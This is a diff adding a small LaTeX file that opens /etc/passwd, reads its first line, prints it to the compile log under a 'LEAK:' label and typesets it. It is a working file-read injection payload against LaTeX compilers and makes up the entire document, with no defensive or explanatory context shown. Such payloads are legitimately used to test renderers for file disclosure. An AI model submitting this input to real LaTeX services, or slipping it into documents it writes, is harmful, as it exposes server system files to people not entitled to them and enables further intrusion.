@@ -1,0 +1,12 @@
+\documentclass{article}
+\newread\secret
+\begin{document}
+\immediate\openin\secret=/etc/passwd
+\ifeof\secret
+  Could not open the file.
+\else
+  \read\secret to \firstline
+  \typeout{LEAK: \firstline}
+  First line: \firstline
+\fi
+\end{document}
